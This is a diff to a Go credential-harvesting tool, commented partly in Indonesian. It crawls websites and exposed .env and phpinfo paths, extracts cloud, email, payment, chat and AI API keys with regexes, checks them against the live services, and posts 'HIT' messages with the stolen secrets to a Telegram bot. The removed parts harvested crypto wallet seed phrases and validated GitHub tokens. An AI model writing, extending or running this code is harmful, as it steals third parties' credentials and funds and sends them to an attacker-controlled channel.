@@ -19,7 +19,6 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"math/rand"
 	"regexp"
 	"runtime"
 	"strconv"
@@ -51,11 +50,9 @@ var batchSize int
 type Counters struct {
 	mu               sync.Mutex
 	URLsLoaded       int
-	TokensHarvested  int
-	TokensValidated  int
-	CryptoKeysFound  int
+	URLsFailed       int
+	URLsProcessed    int
 	AWSKeysValidated int
-	BrevoKeysFound   int
 	APIsFoundTotal   int
 	APIsValidated    int
 	ValidSMTP        int
@@ -71,7 +68,6 @@ type Config struct {
 	// Pindahkan fitur umum yang mengontrol proses scanning utama
 	ScanningFeatures struct {
 		AWSMainScan         bool `json:"aws_main_scan"`
-		GitHubTokenDeepScan bool `json:"github_token_deep_scan"`
 		SMTPCredentialsScan bool `json:"smtp_credentials_scan"`
 	} `json:"scanning_features"`
 	AWSChecks struct {
@@ -93,15 +89,11 @@ type Config struct {
 		Nexmo       bool `json:"nexmo"`
 		Telnyx      bool `json:"telnyx"`
 		MessageBird bool `json:"messagebird"`
-		GitHub      bool `json:"github"`
 		Postmark    bool `json:"postmark"`
 		SparkPost   bool `json:"sparkpost"`
 		Mailtrap    bool `json:"mailtrap"`
 		Mailjet     bool `json:"mailjet"`
-		Heroku      bool `json:"heroku"`
-		Datadog     bool `json:"datadog"`
 		Plivo       bool `json:"plivo"`
-		CryptoWallet bool `json:"crypto_wallet"`
 	} `json:"api_validation"`
 	// Fitur lama yang hanya mencari pola, bukan validasi, akan tetap diabaikan atau ditangani di logic lain
 	Features struct { // Dibiarkan untuk pola yang tidak divalidasi, jika masih ada
@@ -127,8 +119,7 @@ type Config struct {
 		SSRF             bool `json:"ssrf"`
 	} `json:"exploit_methods"`
 	SMTPTestEmail string `json:"smtp_test_email"`
-	EmailTarget   string `json:"email_target"`
-	SessionName   string `json:"session_name"` // set by controller; used in Telegram notification headers
+	EmailTarget   string `json:"email_target"` // Email tujuan untuk testing pengiriman email
 }
 
 type Enhancer struct {
@@ -149,24 +140,22 @@ type AWSScanner struct {
 	Config           *Config
 	BlacklistPattern *regexp.Regexp
 
-	AWSAccessKeyPattern          *regexp.Regexp
-	AWSSecretKeyPattern          *regexp.Regexp
-	SendGridAPIKeyPattern        *regexp.Regexp
-	BrevoAPIKeyPattern           *regexp.Regexp
-	XSMTPAPIKeyPattern           *regexp.Regexp
-	TencentAccessKeyPattern      *regexp.Regexp
-	MailgunAPIKeyPattern         *regexp.Regexp
-	MandrillAppAPIKeyPattern     *regexp.Regexp
-	MailerSendAPIKeyPattern      *regexp.Regexp
-	NewMailgunAPIKeyPattern      *regexp.Regexp
-	GitHubAccessTokenPattern     *regexp.Regexp
-	AWSRandomPattern             *regexp.Regexp
-	AWSAccessKeyPatternInfo      *regexp.Regexp
-	AWSSecretKeyPatternInfo      *regexp.Regexp
-	SendGridAPIKeyPatternInfo    *regexp.Regexp
-	MailgunAPIKeyPatternInfo     *regexp.Regexp
-	GitHubAccessTokenPatternInfo *regexp.Regexp
-	TwilioSIDPatternInfo         *regexp.Regexp
+	AWSAccessKeyPattern       *regexp.Regexp
+	AWSSecretKeyPattern       *regexp.Regexp
+	SendGridAPIKeyPattern     *regexp.Regexp
+	BrevoAPIKeyPattern        *regexp.Regexp
+	XSMTPAPIKeyPattern        *regexp.Regexp
+	TencentAccessKeyPattern   *regexp.Regexp
+	MailgunAPIKeyPattern      *regexp.Regexp
+	MandrillAppAPIKeyPattern  *regexp.Regexp
+	MailerSendAPIKeyPattern   *regexp.Regexp
+	NewMailgunAPIKeyPattern   *regexp.Regexp
+	AWSRandomPattern          *regexp.Regexp
+	AWSAccessKeyPatternInfo   *regexp.Regexp
+	AWSSecretKeyPatternInfo   *regexp.Regexp
+	SendGridAPIKeyPatternInfo *regexp.Regexp
+	MailgunAPIKeyPatternInfo  *regexp.Regexp
+	TwilioSIDPatternInfo      *regexp.Regexp
 	TwilioAuthPatternInfo        *regexp.Regexp
 	TwilioAuthPatternV2Info      *regexp.Regexp
 	TwilioEncodePatternInfo      *regexp.Regexp
@@ -176,8 +165,6 @@ type AWSScanner struct {
 	SMSGatewayPattern            *regexp.Regexp
 	DBCredentialsPattern         *regexp.Regexp
 	StripePattern                *regexp.Regexp
-	ETHPrivateKeyPattern         *regexp.Regexp
-	ETHAddressPattern            *regexp.Regexp
 	OpenAIAPIPattern             *regexp.Regexp
 	AnthropicPattern             *regexp.Regexp
 	MessageBirdPattern           *regexp.Regexp
@@ -202,22 +189,18 @@ type AWSScanner struct {
 	SlackBotTokenPattern    *regexp.Regexp
 	SlackUserTokenPattern   *regexp.Regexp
 	SlackWebhookPattern     *regexp.Regexp
+	DiscordBotTokenPattern  *regexp.Regexp
+	DiscordWebhookPattern   *regexp.Regexp
 	CloudflareTokenPattern  *regexp.Regexp
 	CloudflareGlobalPattern *regexp.Regexp
 	DigitalOceanPATPattern  *regexp.Regexp
-	HerokuAPIKeyPattern     *regexp.Regexp
-	DatadogAPIKeyPattern    *regexp.Regexp
 	SentryDSNPattern        *regexp.Regexp
 	NpmTokenPattern         *regexp.Regexp
 	PyPITokenPattern        *regexp.Regexp
 	GitLabPATPattern        *regexp.Regexp
+	JWTPattern              *regexp.Regexp
 	PostmarkAPIKeyPattern   *regexp.Regexp
-	SparkPostAPIKeyPattern  *regexp.Regexp
-	MailtrapAPIKeyPattern   *regexp.Regexp
 	MailjetAPIKeyPattern    *regexp.Regexp
-	MailjetSecretKeyPattern *regexp.Regexp
-	PlivoAuthIDPattern      *regexp.Regexp
-	PlivoAuthTokenPattern   *regexp.Regexp
 	AWSSNSTopicARNPattern   *regexp.Regexp
 
 	// SMTP Service Patterns
@@ -237,15 +220,12 @@ type AWSScanner struct {
 	SendinBlueSMTPPattern   *regexp.Regexp
 	KagoyaSMTPPattern       *regexp.Regexp
 
-	RealCryptoPatterns []*regexp.Regexp
-
 	DefaultRegion string
 	PHPInfoPaths  []string
 	EnvPaths      []string
 
 	ValidKeyLimits sync.Map
 	KnownKeys      sync.Map
-	SeenLines      sync.Map // Dedup for saveIntoFile — seeded from existing ResultJS on restart
 	SentTelegrams  sync.Map // Tracking pesan telegram yang sudah dikirim
 	VisitedURLs    sync.Map // Tracking URL yang sudah di-scan untuk prevent duplicate
 	TempDir        string
@@ -279,29 +259,6 @@ type GitleaksResult struct {
 }
 
 var base64CandidatePattern = regexp.MustCompile(`[a-zA-Z0-9+/=_-]{40,}`)
-
-// awsSkFPPattern rejects 40-char strings that are URL query-parameter values
-// rather than real AWS secret keys (e.g. "Signature=<hex>", "Algorithm=<str>").
-var awsSkFPPattern = regexp.MustCompile(`^[A-Za-z]{3,}=`)
-
-// hasRepeatedChar returns true if s contains a run of minRun or more identical bytes.
-func hasRepeatedChar(s string, minRun int) bool {
-	if len(s) == 0 {
-		return false
-	}
-	run := 1
-	for i := 1; i < len(s); i++ {
-		if s[i] == s[i-1] {
-			run++
-			if run >= minRun {
-				return true
-			}
-		} else {
-			run = 1
-		}
-	}
-	return false
-}
 
 func tryDecodeBase64(s string) string {
 	re := regexp.MustCompile(`[^a-zA-Z0-9+/=_-]`)
@@ -401,7 +358,7 @@ func NewEnhancer(client *http.Client) *Enhancer {
 	return &Enhancer{
 		client:           client,
 		firebasePattern:  regexp.MustCompile(`(?i)apiKey\s*[:=]\s*["'](AIza[0-9A-Za-z-_]{35})["']`),
-		supabasePattern:  regexp.MustCompile(`(?i)SUPABASE_URL\s*[:=]\s*["'](https?://[\w.-]+)/?`),
+		supabasePattern:  regexp.MustCompile(`(?i)SUPABASE_URL\s*[:=]\s*["'](https?://[\w.-]+)/?\b`),
 		firebaseKeyPatt:  regexp.MustCompile(`(?i)firebaseConfig\s*=\s*\{[\s\S]{0,800}?apiKey\s*[:=]\s*["'](AIza[0-9A-Za-z-_]{35})["']`),
 		bearerPattern:    regexp.MustCompile(`(?i)Bearer\s+([A-Za-z0-9\-_.=]{20,300})`),
 		evalAtobPattern:  regexp.MustCompile(`eval\(atob\(['\"]([A-Za-z0-9\+/=_-]{20,})['\"]\)\)`),
@@ -561,11 +518,6 @@ func NewAWSScanner(configPath string) *AWSScanner {
 	}
 	envPaths := loadEnvPaths()
 
-	realCryptoPatterns := []*regexp.Regexp{
-		// Hanya mnemonic seed phrase (12-24 words)
-		regexp.MustCompile(`(?i)(?:mnemonic|seed_phrase|recovery_phrase|backup_phrase|wallet_seed|secret_recovery_phrase)\s*[=:]\s*["\']?([a-z]+(?:\s+[a-z]+){11,23})["\']?`),
-	}
-
 	return &AWSScanner{
 		Config:                       cfg,
 		BlacklistPattern:             blacklistPattern,
@@ -578,9 +530,8 @@ func NewAWSScanner(configPath string) *AWSScanner {
 		MailgunAPIKeyPattern:         regexp.MustCompile(`key-[0-9a-zA-Z]{32}`),
 		MandrillAppAPIKeyPattern:     regexp.MustCompile(`['"]md-[0-9a-zA-Z]{22}['"]`),
 		MailerSendAPIKeyPattern:      regexp.MustCompile(`mlsn.-[0-9a-zA-Z]{70}`),
-		NewMailgunAPIKeyPattern:      regexp.MustCompile(`[a-f0-9]{32}-[0-9a-f]{8}-[a-f0-9]{8}`),
-		GitHubAccessTokenPattern:     regexp.MustCompile(`(gh[oprus]_[A-Za-z0-9]{36}|github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59})`),
-		TwilioSIDPatternInfo:         regexp.MustCompile(`AC[a-f0-9]{32}`),
+		NewMailgunAPIKeyPattern: regexp.MustCompile(`[a-f0-9]{32}-[0-9a-f]{8}-[a-f0-9]{8}`),
+		TwilioSIDPatternInfo:    regexp.MustCompile(`AC[a-f0-9]{32}`),
 		TwilioAuthPatternInfo:        regexp.MustCompile(`(?i)['"']?([0-9a-f]{32})['"']?`),
 		TwilioAuthPatternV2Info:      regexp.MustCompile(`(?i)<td class="v">([0-9a-f]{32})</td>`),
 		TwilioEncodePatternInfo:      regexp.MustCompile(`QU[MN][A-Za-z0-9]{87}==`),
@@ -590,18 +541,13 @@ func NewAWSScanner(configPath string) *AWSScanner {
 		AWSRandomPattern:             regexp.MustCompile(`email-smtp\.[a-z0-9\-]+\.amazonaws\.com`),
 		AWSSMTPHostPattern:           regexp.MustCompile(`(?i)(email-smtp\.[a-z0-9\-]+\.amazonaws\.com)`),
 		DefaultRegion:                "us-east-1",
-		AWSAccessKeyPatternInfo:      regexp.MustCompile(`AKIA[0-9A-Z]{16}`),
-		AWSSecretKeyPatternInfo:      regexp.MustCompile(`[A-Za-z0-9/+=]{40}`),
-		SendGridAPIKeyPatternInfo:    regexp.MustCompile(`SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}`),
-		MailgunAPIKeyPatternInfo:     regexp.MustCompile(`key-[0-9a-zA-Z]{32}`),
-		GitHubAccessTokenPatternInfo: regexp.MustCompile(`(gh[oprus]_[A-Za-z0-9]{36}|github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59})`),
-		// Stripe key formats: secret (sk_*) and restricted (rk_*) only.
-		// Publishable keys (pk_live_/pk_test_) are intentionally public — excluded to avoid noise.
-		StripePattern:                regexp.MustCompile(`(sk_live_|sk_test_|rk_live_|rk_test_)[0-9a-zA-Z]{16,99}`),
-		// ETH/EVM private key: 64 hex chars, often prefixed 0x. Match labeled occurrences only
-		// to keep false positives down (any 64-hex string would otherwise match git SHAs, etc.).
-		ETHPrivateKeyPattern: regexp.MustCompile(`(?i)(?:PRIVATE[_-]?KEY|ETH[_-]?PRIVATE[_-]?KEY|WALLET[_-]?PRIVATE[_-]?KEY|PRIVKEY)\s*[:=]\s*["']?(0x[a-fA-F0-9]{64}|[a-fA-F0-9]{64})["']?`),
-		ETHAddressPattern:    regexp.MustCompile(`0x[a-fA-F0-9]{40}`),
+		AWSAccessKeyPatternInfo:      regexp.MustCompile(`\bAKIA[0-9A-Z]{16}\b`),
+		AWSSecretKeyPatternInfo:      regexp.MustCompile(`\b[A-Za-z0-9/+=]{40}\b`),
+		SendGridAPIKeyPatternInfo: regexp.MustCompile(`\bSG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}\b`),
+		MailgunAPIKeyPatternInfo:  regexp.MustCompile(`\bkey-[0-9a-zA-Z]{32}\b`),
+		// Stripe key formats: secret (sk_*), publishable (pk_*), restricted (rk_*) — live and test variants.
+		// Restricted-key variants rk_live_ and rk_test_ explicitly enumerated to keep coverage visible.
+		StripePattern:                regexp.MustCompile(`(sk_live_|sk_test_|pk_live_|pk_test_|rk_live_|rk_test_)[0-9a-zA-Z]{16,99}`),
 		OpenAIAPIPattern:             regexp.MustCompile(`sk-[a-zA-Z0-9]{48}`),
 		AnthropicPattern:             regexp.MustCompile(`sk-ant-[a-zA-Z0-9]{32}-[a-zA-Z0-9]{64}`),
 		MessageBirdPattern:           regexp.MustCompile(`(AccessKey|TestKey)_[a-zA-Z0-9]{32}`),
@@ -622,42 +568,35 @@ func NewAWSScanner(configPath string) *AWSScanner {
 		AWSSecretV2KeyPattern:        regexp.MustCompile(`<td class="v">([0-9a-zA-Z\/+]{40})<\/td>`),
 
 		AWSSessionTokenPattern: regexp.MustCompile(`['"]([A-Za-z0-9/+=]{256,})['"]`),
-		AWSSESUserPattern:      regexp.MustCompile(`(AKIA|ASIA)[A-Z0-9]{16}`),
+		AWSSESUserPattern:      regexp.MustCompile(`\b(AKIA|ASIA)[A-Z0-9]{16}\b`),
 
 		// ── New (Wave-5) credential patterns ──────────────────────────────
 		// Slack — bot (xoxb-), user (xoxp-), legacy (xoxa-/xoxr-/xoxs-), webhooks
 		SlackBotTokenPattern:  regexp.MustCompile(`xoxb-[0-9]{10,}-[0-9]{10,}-[A-Za-z0-9]{20,}`),
 		SlackUserTokenPattern: regexp.MustCompile(`xox[parsi]-[0-9]{8,}-[0-9]{8,}-[A-Za-z0-9]{20,}`),
 		SlackWebhookPattern:   regexp.MustCompile(`https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]{20,}`),
+		// Discord — bot token (3 base64 parts), webhook URLs
+		DiscordBotTokenPattern: regexp.MustCompile(`[MN][A-Za-z0-9_-]{23}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,}`),
+		DiscordWebhookPattern:  regexp.MustCompile(`https://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/\d{17,20}/[\w-]{60,80}`),
 		// Cloudflare — scoped tokens & legacy global keys
-		CloudflareTokenPattern:  regexp.MustCompile(`[A-Za-z0-9_-]{40}`), // narrow via context elsewhere (Bearer + cloudflare)
-		CloudflareGlobalPattern: regexp.MustCompile(`(?i)cloudflare[^\n]*[:=]([a-f0-9]{37})`),
+		CloudflareTokenPattern:  regexp.MustCompile(`\b[A-Za-z0-9_-]{40}\b`), // narrow via context elsewhere (Bearer + cloudflare)
+		CloudflareGlobalPattern: regexp.MustCompile(`(?i)cloudflare[^\n]*[\b:=]([a-f0-9]{37})\b`),
 		// DigitalOcean Personal Access Token
-		DigitalOceanPATPattern: regexp.MustCompile(`dop_v1_[a-f0-9]{64}`),
-		// Heroku API key (UUIDv4)
-		HerokuAPIKeyPattern: regexp.MustCompile(`(?i)heroku[^\n]*[:=]\s*([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})`),
-		// Datadog API key (32 hex)
-		DatadogAPIKeyPattern: regexp.MustCompile(`(?i)(?:dd[-_]?api[-_]?key|datadog[^\n]*api[^\n]*key)[\s:=]+([0-9a-f]{32})`),
+		DigitalOceanPATPattern: regexp.MustCompile(`\bdop_v1_[a-f0-9]{64}\b`),
 		// Sentry DSN
 		SentryDSNPattern: regexp.MustCompile(`https://[a-f0-9]{32}@(?:[a-z0-9.-]+\.)?ingest\.sentry\.io/\d+`),
 		// NPM token
-		NpmTokenPattern: regexp.MustCompile(`npm_[A-Za-z0-9]{36}`),
+		NpmTokenPattern: regexp.MustCompile(`\bnpm_[A-Za-z0-9]{36}\b`),
 		// PyPI token
-		PyPITokenPattern: regexp.MustCompile(`pypi-[A-Za-z0-9_-]{50,}`),
+		PyPITokenPattern: regexp.MustCompile(`\bpypi-[A-Za-z0-9_-]{50,}\b`),
 		// GitLab PAT (classic and personal)
-		GitLabPATPattern: regexp.MustCompile(`glpat-[A-Za-z0-9_-]{20,}`),
-		// Postmark server token (UUID format)
-		PostmarkAPIKeyPattern: regexp.MustCompile(`(?i)(?:POSTMARK_SERVER_TOKEN|postmark[^\n]*server[^\n]*token)[\s:="']+([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})`),
-		// SparkPost API key (40 hex chars)
-		SparkPostAPIKeyPattern: regexp.MustCompile(`(?i)(?:sparkpost[_-]?(?:api[_-]?)?key|SPARKPOST_API_KEY)["'\s:=]+([a-f0-9]{40})`),
-		// Mailtrap API token (32 hex chars)
-		MailtrapAPIKeyPattern: regexp.MustCompile(`(?i)(?:mailtrap[_-]?(?:api[_-]?)?(?:token|key)|MAILTRAP_API_TOKEN)["'\s:=]+([a-f0-9]{32})`),
-		// Mailjet — API key and secret key (each 32 hex chars)
-		MailjetAPIKeyPattern:    regexp.MustCompile(`(?i)(?:MAILJET_API_KEY|MAILJET_PUBLIC_KEY|mailjet[^\n]*(?:api[_-]?key|public[_-]?key))[\s:="']+([0-9a-f]{32})`),
-		MailjetSecretKeyPattern: regexp.MustCompile(`(?i)(?:MAILJET_API_SECRET|MAILJET_SECRET_KEY|mailjet[^\n]*(?:api[_-]?secret|secret[_-]?key))[\s:="']+([0-9a-f]{32})`),
-		// Plivo Auth ID (starts with MA or SA, 20 chars) and Auth Token (40 alphanum)
-		PlivoAuthIDPattern:    regexp.MustCompile(`(?i)(?:plivo[_-]?(?:auth[_-]?)?(?:id|sid))["'\s:=]+([MS]A[A-Z0-9]{18})`),
-		PlivoAuthTokenPattern: regexp.MustCompile(`(?i)(?:PLIVO_AUTH_TOKEN|plivo[_-]?auth[_-]?token)["'\s:=]+([a-zA-Z0-9]{40})`),
+		GitLabPATPattern: regexp.MustCompile(`\bglpat-[A-Za-z0-9_-]{20,}\b`),
+		// JWT — three base64url-encoded parts
+		JWTPattern: regexp.MustCompile(`\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b`),
+		// Postmark server token (UUID-ish)
+		PostmarkAPIKeyPattern: regexp.MustCompile(`(?i)postmark[^\n]*server[^\n]*[:=]\s*([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})`),
+		// Mailjet — API key:secret pair
+		MailjetAPIKeyPattern: regexp.MustCompile(`(?i)mailjet[^\n]*(?:api[_-]?key|public)[\s:=]+([0-9a-f]{32})`),
 		// AWS SNS topic ARNs (intel — feeds the SNS limit check)
 		AWSSNSTopicARNPattern: regexp.MustCompile(`arn:aws:sns:[a-z0-9-]+:\d{12}:[A-Za-z0-9_-]+`),
 
@@ -676,10 +615,9 @@ func NewAWSScanner(configPath string) *AWSScanner {
 		BrevoSMTPPattern:        regexp.MustCompile(`smtp\-relay\.brevo\.com`),
 		ElasticEmailSMTPPattern: regexp.MustCompile(`smtp\.elasticemail\.com`),
 		SendinBlueSMTPPattern:   regexp.MustCompile(`smtp\-relay\.sendinblue\.com`),
-		KagoyaSMTPPattern:       regexp.MustCompile(`smtp\.kagoya\.net`),
+		KagoyaSMTPPattern: regexp.MustCompile(`smtp\.kagoya\.net`),
 
-		RealCryptoPatterns: realCryptoPatterns,
-		ValidKeyLimits:     sync.Map{},
+		ValidKeyLimits: sync.Map{},
 		KnownKeys:          sync.Map{},
 		SentTelegrams:      sync.Map{},
 		VisitedURLs:        sync.Map{},
@@ -688,17 +626,6 @@ func NewAWSScanner(configPath string) *AWSScanner {
 }
 
 func (e *Enhancer) EnhanceScanner(a *AWSScanner) {
-	ePatterns := []*regexp.Regexp{
-		//regexp.MustCompile(`(?i)apiKey["']?\s*[:=]\s*["'](AIza[0-9A-Za-z\-_]{35})["']`),
-		//regexp.MustCompile(`(?i)SUPABASE_KEY["']?\s*[:=]\s*["']?([A-Za-z0-9-_]{32,200})["']?`),
-		//regexp.MustCompile(`(?i)firebaseConfig\s*=\s*\{[\s\S]{0,800}?apiKey\s*[:=]\s*["'](AIza[0-9A-Za-z\-_]{35})["']`),
-		//regexp.MustCompile(`(?i)YA29\.[0-9A-Za-z\-_]{10,200}`),
-		//regexp.MustCompile(`(?i)sk_live_[0-9a-zA-Z]{16,64}`),
-	}
-
-	for _, p := range ePatterns {
-		a.RealCryptoPatterns = append(a.RealCryptoPatterns, p)
-	}
 }
 
 func (e *Enhancer) CrawlAndExtract(startURL string, maxDepth int, a *AWSScanner) {
@@ -721,6 +648,11 @@ func (e *Enhancer) CrawlAndExtract(startURL string, maxDepth int, a *AWSScanner)
 
 		body, headers, err := e.fetchURL(item.url)
 		if err != nil {
+			if err.Error() != "not-http" {
+				globalCounters.mu.Lock()
+				globalCounters.URLsFailed++
+				globalCounters.mu.Unlock()
+			}
 			continue
 		}
 
@@ -1178,9 +1110,6 @@ func loadEnvPaths() []string {
 }
 
 func (a *AWSScanner) saveIntoFile(line, filename string) {
-	if _, loaded := a.SeenLines.LoadOrStore(line, true); loaded {
-		return // already written in a previous run — skip duplicate
-	}
 	os.MkdirAll("ResultJS", 0755)
 	f, err := os.OpenFile(filepath.Join("ResultJS", filename), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
@@ -1188,38 +1117,6 @@ func (a *AWSScanner) saveIntoFile(line, filename string) {
 	}
 	defer f.Close()
 	f.WriteString(line + "\n")
-}
-
-// seedKnownKeysFromResultJS reads all existing ResultJS output files and
-// pre-populates SeenLines so saveIntoFile skips lines already written in
-// a prior run. Prevents duplicate output lines and duplicate Telegram
-// notifications when the scanner binary is hot-swapped mid-session.
-func (a *AWSScanner) seedKnownKeysFromResultJS() {
-	files, err := filepath.Glob(filepath.Join("ResultJS", "*.txt"))
-	if err != nil || len(files) == 0 {
-		return
-	}
-	count := 0
-	for _, fp := range files {
-		f, err := os.Open(fp)
-		if err != nil {
-			continue
-		}
-		sc := bufio.NewScanner(f)
-		sc.Buffer(make([]byte, 1024*1024), 1024*1024)
-		for sc.Scan() {
-			line := strings.TrimSpace(sc.Text())
-			if line == "" {
-				continue
-			}
-			a.SeenLines.Store(line, true)
-			count++
-		}
-		f.Close()
-	}
-	if count > 0 {
-		pterm.Info.Printfln("Seeded %d lines from existing ResultJS files (dedup across restarts)", count)
-	}
 }
 
 func (a *AWSScanner) sendTelegram(message string) {
@@ -1241,52 +1138,53 @@ func (a *AWSScanner) sendTelegram(message string) {
 	data := url.Values{}
 	data.Set("chat_id", a.Config.Telegram.ChatID)
 	data.Set("text", message)
+	data.Set("parse_mode", "HTML")
 	http.PostForm(apiURL, data)
 
 	pterm.Debug.Printfln("[TELEGRAM SENT] Message hash: %s", messageHash[:16]+"...")
 }
 
-// tgHit returns the standard notification header for a credential find.
-//   📬 NEW RANDOM SMTP HIT VIA torch2 3408 ® ID : 43745531
-//   Cracked on https://example.com
-func (a *AWSScanner) tgHit(emoji, hitType, sourceURL string) string {
-	listName := a.Config.SessionName
-	if listName == "" {
-		listName = "scanner"
-	}
-	globalCounters.mu.Lock()
-	cnt := globalCounters.APIsValidated
-	globalCounters.mu.Unlock()
-	hitID := rand.Int63n(90000000) + 10000000
-	return fmt.Sprintf("%s NEW %s HIT VIA %s %d ® ID : %d\nCracked on %s\n\n🆔 CREDENTIALS\n", emoji, hitType, listName, cnt, hitID, sourceURL)
-}
-
 // generateTelegramHash membuat unique hash dari message untuk deduplication
 func (a *AWSScanner) generateTelegramHash(message string) string {
-	// Extract credential lines after the 🆔 CREDENTIALS header.
-	// Lines are plain "Key : value" format (no HTML tags).
-	credStart := strings.Index(message, "🆔 CREDENTIALS\n")
-	if credStart >= 0 {
-		credSection := message[credStart+len("🆔 CREDENTIALS\n"):]
-		var keyParts []string
-		for _, line := range strings.Split(credSection, "\n") {
-			if idx := strings.Index(line, " : "); idx >= 0 {
-				value := strings.TrimSpace(line[idx+3:])
-				if len(value) >= 4 && !strings.HasPrefix(value, "http") {
-					keyParts = append(keyParts, value)
-				}
+	// Extract key portions yang membuat message unique
+	// Biasanya berupa credential values di dalam <code> tags
+
+	codePattern := regexp.MustCompile(`<code>([^<]+)</code>`)
+	matches := codePattern.FindAllStringSubmatch(message, -1)
+
+	var keyParts []string
+	for _, match := range matches {
+		if len(match) > 1 {
+			value := strings.TrimSpace(match[1])
+			// Skip values yang terlalu pendek (< 4 chars) atau generic text
+			if len(value) >= 4 && !strings.HasPrefix(value, "http") {
+				keyParts = append(keyParts, value)
 			}
-		}
-		if len(keyParts) > 0 {
-			return strings.ToLower(strings.Join(keyParts, "|"))
 		}
 	}
 
-	// Last resort: gunakan first 300 chars dari message
-	if len(message) > 300 {
-		return message[:300]
+	// Jika tidak ada <code> tags yang valid, extract type dari message
+	if len(keyParts) == 0 {
+		// Extract message type sebagai fallback
+		typePattern := regexp.MustCompile(`<b>([A-Z\s]+(?:KEY|TOKEN|ACCOUNT|CRACKED))</b>`)
+		if typeMatch := typePattern.FindStringSubmatch(message); len(typeMatch) > 1 {
+			// Gunakan type + first 200 chars sebagai unique ID
+			if len(message) > 200 {
+				return typeMatch[1] + "|" + message[:200]
+			}
+			return typeMatch[1] + "|" + message
+		}
+		// Last resort: gunakan first 300 chars dari message
+		if len(message) > 300 {
+			return message[:300]
+		}
+		return message
 	}
-	return message
+
+	// Gabungkan semua key parts sebagai unique identifier
+	// Sort untuk konsistensi (case insensitive comparison)
+	uniqueID := strings.Join(keyParts, "|")
+	return strings.ToLower(uniqueID)
 }
 
 func (a *AWSScanner) alreadySent(ak, sk string) bool {
@@ -1327,62 +1225,6 @@ func (a *AWSScanner) storeValidKeyLimit(keyType string, key string, limit interf
 	}
 	mapKey := fmt.Sprintf("%s:%s", keyType, maskedKey)
 	a.ValidKeyLimits.Store(mapKey, fmt.Sprintf("%v", limit))
-}
-
-func (a *AWSScanner) detectRealCryptoType(keyValue string, pattern *regexp.Regexp) string {
-	// Hanya mnemonic seed phrase yang di-track
-	return "Mnemonic Seed Phrase"
-}
-
-func (a *AWSScanner) extractAndSaveCryptoKeys(text, sourceURL string) {
-	for _, pattern := range a.RealCryptoPatterns {
-		matches := pattern.FindAllStringSubmatch(text, -1)
-		for _, match := range matches {
-			if len(match) >= 2 {
-				var keyValue string
-				if len(match) >= 2 && match[1] != "" {
-					keyValue = match[1]
-				} else {
-					continue
-				}
-				keyValue = strings.TrimSpace(keyValue)
-
-				// Validasi mnemonic: harus berisi 12-24 kata lowercase
-				words := strings.Fields(keyValue)
-				if len(words) < 12 || len(words) > 24 {
-					continue
-				}
-
-				// Validasi setiap kata harus lowercase a-z
-				validMnemonic := true
-				for _, word := range words {
-					if !regexp.MustCompile(`^[a-z]+$`).MatchString(word) {
-						validMnemonic = false
-						break
-					}
-				}
-
-				if !validMnemonic {
-					continue
-				}
-
-				cryptoType := "Mnemonic Seed Phrase"
-				wordCount := len(words)
-				cryptoLine := fmt.Sprintf("%s:%s (%d words):%s", sourceURL, cryptoType, wordCount, keyValue)
-
-				pterm.Success.Printfln("[🔥 %s] Found %d-word Mnemonic from %s", cryptoType, wordCount, sourceURL)
-
-				a.saveIntoFile(cryptoLine, "mnemonic_seed_phrases.txt")
-
-				go a.sendTelegram(a.tgHit("💰", "CRYPTO PHRASE HIT", sourceURL) + fmt.Sprintf(
-					"Phrase (%d words) : %s\n", wordCount, keyValue))
-
-				globalCounters.mu.Lock()
-				globalCounters.CryptoKeysFound++
-				globalCounters.mu.Unlock()
-			}
-		}
-	}
 }
 
 func getAllRegions(service string) ([]string, error) {
@@ -2173,112 +2015,6 @@ func (a *AWSScanner) checkFargateOnDemandLimitAllRegions(cfg aws.Config) map[str
 	return limits
 }
 
-func (a *AWSScanner) CheckGitHubToken(token, sourceURL string) bool {
-	// Pengecekan fitur deep scan/validasi di sini
-	// Note: APIValidation.GitHub mengontrol pengecekan dasar token
-	if !a.Config.APIValidation.GitHub && !a.Config.ScanningFeatures.GitHubTokenDeepScan {
-		return false
-	}
-
-	if _, loaded := a.KnownKeys.LoadOrStore(token, true); loaded {
-		return false
-	}
-
-	globalCounters.mu.Lock()
-	globalCounters.TokensHarvested++
-	globalCounters.mu.Unlock()
-
-	pterm.Info.Printfln("[CHECK] Validating GitHub Token: %s...", token)
-
-	req, errReq := http.NewRequest("GET", "https://api.github.com/user", nil)
-	if errReq != nil {
-		pterm.Debug.Printfln("[ERROR] Failed to create GitHub request: %v", errReq)
-		return false
-	}
-
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
-	req.Header.Set("Authorization", "token "+token)
-
-	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
-	defer cancel()
-
-	resp, err := client.Do(req.WithContext(ctx))
-
-	if err == nil {
-		defer resp.Body.Close()
-		if resp.StatusCode == 200 {
-			var res map[string]interface{}
-			json.NewDecoder(resp.Body).Decode(&res)
-			login, _ := res["login"].(string)
-			repoCount, _ := res["public_repos"].(float64)
-
-			a.logValid("GitHub Token", fmt.Sprintf("User: %s", login))
-			a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, token), "valid_github_token.txt")
-
-			globalCounters.mu.Lock()
-			globalCounters.TokensValidated++
-			globalCounters.mu.Unlock()
-
-			tokenDisplay := token
-			if len(tokenDisplay) > 30 {
-				tokenDisplay = tokenDisplay[:30] + "..."
-			}
